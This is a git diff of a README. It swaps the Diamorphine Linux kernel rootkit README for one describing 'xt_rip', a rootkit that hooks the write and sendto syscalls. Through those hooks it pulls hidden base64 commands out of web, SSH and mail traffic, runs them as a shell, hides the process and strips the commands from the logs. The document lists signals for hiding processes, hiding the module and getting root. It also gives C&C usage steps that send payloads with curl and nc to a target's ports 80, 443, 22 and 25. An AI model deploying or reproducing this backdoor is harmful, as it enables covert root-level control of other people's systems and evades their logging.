@@ -1,89 +1,50 @@
-Diamorphine
-===========
+# xt_rip LKM rootkit
+This rootkit is an attempt to use `write` and `sendto` syscalls as input vectors for a remote backdoor.
 
-Diamorphine is a LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x and ARM64
+A lot of user-provided and unsafe data gets processed through those syscalls since they are used to log connections to web server, failed ssh connections etc.
 
-Features
---
+The module replaces the original syscalls by our own functions which looks for a pattern, extract it so it can be parsed as a C&C command, and strips it from the original buffer so it (hopefully) does not appear anywhere in the logs.
 
-- When loaded, the module starts invisible;
+## Features
+- [x] All features from Diamorphine
+    - [x] Hide process with `kill -31 $PID`
+    - [x] Hide LKM with `kill -63 1`
+    - [x] Give root with `kill -64 1`
+    - [x] Hide files and dirs with name matchin prefix
+- [x] Hook `write` and `sendto`
+    - [x] Read and strip payload from given userland buffer
+    - [x] Decode base64 payload
+    - [x] Pass payload to /bin/sh
+    - [x] Hide generated process
+    - [ ] Add mandatory checksum to payload
+- [ ] Hide arbitrary network connection (http://books.gigatux.nl/mirror/networksecuritytools/0596007949/networkst-CHP-7-SECT-4.html)
 
-- Hide/unhide any process by sending a signal 31;
-
-- Sending a signal 63(to any pid) makes the module become (in)visible;
-
-- Sending a signal 64(to any pid) makes the given user become root;
-
-- Files or directories starting with the MAGIC_PREFIX become invisible;
-
-- Source: https://github.com/m0nad/Diamorphine
-
-Install
---
-
-Verify if the kernel is 2.6.x/3.x/4.x/5.x
-```
-uname -r
-```
-
-Clone the repository
-```
-git clone https://github.com/m0nad/Diamorphine
-```
-
-Enter the folder
-```
-cd Diamorphine
-```
-
-Compile
-```
+## Usage
+```sh
+## On the target
+# Install dependencies (apt only), build
+# and install module
 make
+
+## From the C&C
+# Store marker
+$ export XTRIP_MARKER=__8231061ecdb0740331d289cd1051e197afc568b5__
+
+# Generate payload
+$ ./client 'id > /tmp/id'
+__8231061ecdb0740331d289cd1051e197afc568b5__AwqGpIaVDg1Wl2LK__8231061ecdb0740331d289cd1051e197afc568b5__
+
+# Generate payload and send it to target
+# through HTTP on port 80
+$ ./client 'id > /tmp/id' $TARGET
+
+# Manually send payload to web server
+# on port 443
+$ curl -skA"$(./client 'id > /tmp/id')" https://$TARGET/
+
+# Send payload to SSH on port 22
+$ echo "$(./client 'id > /tmp/id')" | nc $TARGET 22
+
+# Send payload to Exim4 on port 25
+$ echo "$(./client 'id > /tmp/id')" | nc $TARGET 25
 ```
-
-Load the module(as root)
-```
-insmod diamorphine.ko
-```
-
-Uninstall
---
-
-The module starts invisible, to remove you need to make it visible
-```
-kill -63 0
-```
-
-Then remove the module(as root)
-```
-rmmod diamorphine
-```
-
-References
---
-Wikipedia Rootkit
-https://en.wikipedia.org/wiki/Rootkit
-
-Linux Device Drivers
-http://lwn.net/Kernel/LDD3/
-
-LKM HACKING
-https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html
-
-Memset's blog
-http://memset.wordpress.com/
-
-Linux on-the-fly kernel patching without LKM
-http://phrack.org/issues/58/7.html
-
-WRITING A SIMPLE ROOTKIT FOR LINUX
-https://web.archive.org/web/20160620231623/http://big-daddy.fr/repository/Documentation/Hacking/Security/Malware/Rootkits/writing-rootkit.txt
-
-Linux Cross Reference
-http://lxr.free-electrons.com/
-
-zizzu0 LinuxKernelModules
-https://github.com/zizzu0/LinuxKernelModules/
-
-Linux Rootkits: New Methods for Kernel 5.7+
-https://xcellerator.github.io/posts/linux_rootkits_11/
